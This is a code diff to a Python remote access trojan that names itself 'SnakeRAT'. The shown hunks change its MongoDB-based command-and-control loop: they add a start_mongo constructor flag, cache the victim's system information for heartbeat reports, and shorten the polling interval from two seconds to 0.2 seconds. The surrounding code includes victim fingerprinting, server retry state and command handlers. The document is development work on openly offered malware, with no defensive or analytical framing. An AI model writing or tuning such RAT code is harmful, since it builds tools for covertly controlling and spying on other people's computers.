@@ -1873,7 +1873,7 @@ class CommandExecutor:
 class AdvancedRAT:
     """Core RAT functionality with advanced features"""
     
-    def __init__(self):
+    def __init__(self, start_mongo=False):
         print("[*] Init SnakeRAT Subsystems...")
         self.sock = None
         self.connected = False
@@ -1886,7 +1886,7 @@ class AdvancedRAT:
         self.client_id = self.profiler.generate_fingerprint()
         self.current_server_index = 0
         self.retry_count = 0
-        self.mongo_mode = False
+        self.mongo_mode = start_mongo
         self.mongodb_client = None
         self.command_handlers = self._setup_command_handlers()
         
@@ -2450,6 +2450,7 @@ class AdvancedRAT:
             return
 
         last_heartbeat = 0
+        cached_sys_info = locals().get('sys_info')
         
         while self.running and getattr(self, 'mongo_mode', False):
             try:
@@ -2460,7 +2461,9 @@ class AdvancedRAT:
                 if now - last_heartbeat > 30:
                     last_heartbeat = now
                     try:
-                        sys_info = self.profiler.get_system_info()
+                        if cached_sys_info is None:
+                            cached_sys_info = self.profiler.get_system_info()
+                        sys_info = cached_sys_info
                         metrics = self.profiler.get_metrics()
                     except Exception as e:
                         sys_info = {"error": str(e)}
@@ -2555,7 +2558,7 @@ class AdvancedRAT:
                             }}
                         )
 
-                time.sleep(2)
+                time.sleep(0.2)
 
             except Exception as e:
                 self.logger.error(f"Error in MongoDB poll iteration: {e}")
@@ -5402,9 +5405,7 @@ if __name__ == "__main__":
                 except: pass
 
         print("[*] Starting RAT backend...")
-        rat = AdvancedRAT()
-        if args.mongo:
-            rat.mongo_mode = True
+        rat = AdvancedRAT(start_mongo=args.mongo)
         while rat.running:
             time.sleep(1)
 
